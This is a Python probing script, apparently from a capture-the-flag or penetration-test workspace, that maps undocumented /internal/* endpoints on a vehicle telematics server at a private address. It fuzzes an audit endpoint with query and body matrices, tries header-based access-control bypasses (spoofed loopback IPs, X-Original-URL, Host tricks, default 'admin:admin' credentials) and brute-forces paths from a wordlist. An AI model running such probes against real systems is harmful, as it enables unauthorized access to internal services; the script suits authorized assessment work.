#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TSP /internal/* 深挖：把 wave2 全部词当第二段枚举 + 刻画 audit/migrate。

判据（与 0303 同）：
  A = b'404 page not found\\n'   (Go 默认 404，非路由)
  B = b'{"error":"not found"}\\n' (JSON 404，真路由)
任何非 A 的响应都打印；EXC 额外计时与重试。
"""
import json
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()
BASE = "http://10.230.164.2:8080"
TIMEOUT = 3.0
A = b"404 page not found\n"
B = b'{"error":"not found"}\n'
VIN = "CV6FF52FEE9EDDD86"
OUT = "03_EVIDENCE/tsp/0304_internal_deep.json"


def cls(body):
    if body == A:
        return "A-go404"
    if body == B:
        return "B-JSON404"
    return "OTHER"


def call(method, path, body=None, headers=None, timeout=TIMEOUT):
    h = dict(headers or {})
    if body is not None and "Content-Type" not in h:
        h["Content-Type"] = "application/json"
    t0 = time.time()
    try:
        r = requests.request(method, BASE + path, data=body, headers=h,
                             timeout=timeout, allow_redirects=False)
        return r.status_code, r.content, time.time() - t0
    except Exception as e:
        return "EXC", f"{type(e).__name__}".encode(), time.time() - t0


def main():
    rec = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"), "results": []}
    print("=" * 78)
    print(f"/internal/* 深挖  {rec['ts']}")
    print("=" * 78)

    # ---------- 1. /internal/migrate 复现（是否真挂住）----------
    print("\n-- 1. /internal/migrate 复现 x5（GET/POST，计时）--")
    for i in range(5):
        for m in ("GET", "POST"):
            st, body, dt = call(m, "/internal/migrate",
                                b"{}" if m == "POST" else None, timeout=5.0)
            print(f"  try{i+1} {m:4s} /internal/migrate -> {str(st):4s} "
                  f"{dt:6.2f}s len={len(body)} {body[:90]!r}", flush=True)
            rec["results"].append({"probe": "migrate-repro", "method": m,
                                   "status": st, "sec": round(dt, 3),
                                   "body": body.decode("utf-8", "replace")[:200]})

    # ---------- 2. /internal/audit 参数矩阵 ----------
    print("\n-- 2. /internal/audit 参数矩阵（找它到底要什么）--")
    qs = ["?id=1", "?id=0", "?id=", "?limit=10", "?limit=1000", "?offset=0",
          "?vin=" + VIN, "?vin=*", "?campaign=c1", "?campaignId=c1",
          "?record=1", "?seq=1", "?action=sign", "?event=sign", "?user=admin",
          "?type=all", "?all=1", "?format=json", "?raw=1", "?tail=10",
          "?since=0", "?from=0&to=9999999999", "?q=sign", "?q=*",
          "?limit=-1", "?page=1&size=100"]
    for q in qs:
        st, body, dt = call("GET", "/internal/audit" + q)
        flag = "" if cls(body) == "B-JSON404" else "  <<<"
        print(f"  GET /internal/audit{q:34s} -> {str(st):4s} len={len(body):5d} "
              f"{body[:110]!r}{flag}", flush=True)
        rec["results"].append({"probe": "audit-q", "q": q, "status": st,
                               "body": body.decode("utf-8", "replace")[:300]})

    print("\n-- 3. /internal/audit POST body 矩阵 --")
    bodies = [
        b"{}",
        b'{"id":"1"}',
        b'{"vin":"%s"}' % VIN.encode(),
        b'{"limit":100}',
        b'{"action":"read"}',
        b'{"query":"all"}',
        b'{"event":"sign"}',
        b'{"campaign":"c1"}',
        b'{"since":0}',
        b'{"filter":{}}',
        b'[]',
        b'null',
    ]
    for b in bodies:
        st, body, dt = call("POST", "/internal/audit", b)
        flag = "" if cls(body) == "B-JSON404" else "  <<<"
        print(f"  POST /internal/audit {b[:40]!r:44s} -> {str(st):4s} "
              f"len={len(body):5d} {body[:110]!r}{flag}", flush=True)
        rec["results"].append({"probe": "audit-post", "body": b.decode(
            "utf-8", "replace")[:80], "status": st,
            "body": body.decode("utf-8", "replace")[:300]})

    print("\n-- 4. /internal/audit 认证头矩阵 --")
    hs = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Internal": "true"},
        {"X-Internal-Request": "1"},
        {"Authorization": "Bearer admin"},
        {"Authorization": "Basic YWRtaW46YWRtaW4="},
        {"X-Api-Key": "admin"},
        {"X-Admin": "1"},
        {"X-VIN": VIN},
        {"X-TSP-Role": "admin"},
        {"X-Original-URL": "/internal/audit"},
        {"X-Rewrite-URL": "/internal/audit"},
        {"Host": "localhost"},
        {"Host": "internal"},
    ]
    for h in hs:
        st, body, dt = call("GET", "/internal/audit", None, h)
        flag = "" if cls(body) == "B-JSON404" else "  <<<"
        print(f"  hdr {str(h)[:44]:46s} -> {str(st):4s} len={len(body):5d} "
              f"{body[:100]!r}{flag}", flush=True)
        rec["results"].append({"probe": "audit-hdr", "hdr": str(h),
                               "status": st,
                               "body": body.decode("utf-8", "replace")[:300]})

    # ---------- 5. /internal/<word> 全量枚举 ----------
    print("\n-- 5. /internal/<word> 全量枚举（wave2 全部词）--")
    words = []
    try:
        with open("04_SOLVE/web/tools/wordlist_wave2.txt", encoding="utf-8",
                  errors="replace") as f:
            for ln in f:
                w = ln.strip().strip("/")
                if w and not w.startswith("#"):
                    words.append(w)
    except OSError as e:
        print("  cannot load wordlist:", e)
    print(f"  words={len(words)}")
    hits = 0
    for i, w in enumerate(words):
        st, body, dt = call("GET", "/internal/" + w)
        c = cls(body)
        if c != "A-go404":
            hits += 1
            print(f"  HIT  /internal/{w:44s} -> {str(st):4s} len={len(body):5d} "
                  f"{dt:5.2f}s {c} {body[:110]!r}", flush=True)
            rec["results"].append({"probe": "internal-word", "word": w,
                                   "status": st, "sec": round(dt, 3),
                                   "class": c,
                                   "body": body.decode("utf-8", "replace")[:300]})
        if (i + 1) % 300 == 0:
            print(f"  ... {i+1}/{len(words)} hits={hits}", flush=True)
    print(f"  internal-word sweep done: hits={hits}/{len(words)}")

    with open(OUT, "w", encoding="utf-8") as f:
        json.dump(rec, f, indent=1, ensure_ascii=False)
    print("\n[*] wrote", OUT)
    print("[done]", time.strftime("%Y-%m-%dT%H:%M:%S%z"))
    return 0


if __name__ == "__main__":
    sys.exit(main())
